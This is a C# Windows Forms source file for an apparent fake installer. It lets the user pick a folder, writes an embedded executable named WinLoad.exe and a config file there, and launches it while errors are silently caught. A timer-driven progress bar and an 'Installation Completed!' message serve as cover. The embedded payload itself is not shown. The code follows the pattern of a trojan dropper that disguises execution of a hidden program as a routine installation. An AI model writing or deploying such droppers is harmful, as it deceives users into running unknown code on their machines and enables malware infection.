using System.Windows.Forms.Design;
using System.IO;
using System.Diagnostics;

namespace FakeWinForm
{
    public partial class Form1 : Form
    {
        private System.Windows.Forms.Timer time = new System.Windows.Forms.Timer();

        public Form1()
        {
            InitializeComponent();
        }

        public void browseBtn_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog fakePath = new FolderBrowserDialog();
            fakePath.ShowDialog();
            pathTxtBox.Text = fakePath.SelectedPath;
        }

        public void pathTxtBox_MouseDown(object sender, MouseEventArgs e)
        {
            if (pathTxtBox.Text == "Enter Path to Install...")
            {
                pathTxtBox.Text = "";
            }
        }

        public void installBtn_Click(object sender, EventArgs e)
        {
            if (!Directory.Exists(pathTxtBox.Text))
            {
                MessageBox.Show("Invalid Path", "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
            }
            else
            {
                time.Interval = 5000;
                time.Tick += new EventHandler(IncreaseProgressBar);
                time.Start();

                File.WriteAllBytes(pathTxtBox.Text + "\\WinLoad.exe", Properties.Resources.WinLoad);
                File.WriteAllText(pathTxtBox.Text + "\\config.txt", Properties.Resources.config);

                try
                {
                    Process proc = new Process();
                    proc.StartInfo.FileName = pathTxtBox.Text + "\\WinLoad.exe";
                    proc.StartInfo.WorkingDirectory = pathTxtBox.Text;
                    proc.Start();
                }
                catch { }
            }

            
        }

        public void IncreaseProgressBar(object sender, EventArgs e)
        {
            progressBar1.Increment(1000);
            if (progressBar1.Value == progressBar1.Maximum)
            {
                time.Stop();
                MessageBox.Show("Installation Completed!", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information);

                //Directory.CreateDirectory(pathTxtBox.Text + "\\Running");
                //File.SetAttributes(pathTxtBox.Text + "\\Running",
                        //(new FileInfo(pathTxtBox.Text + "\\Running")).Attributes | FileAttributes.Normal);

            }
        }
    }
}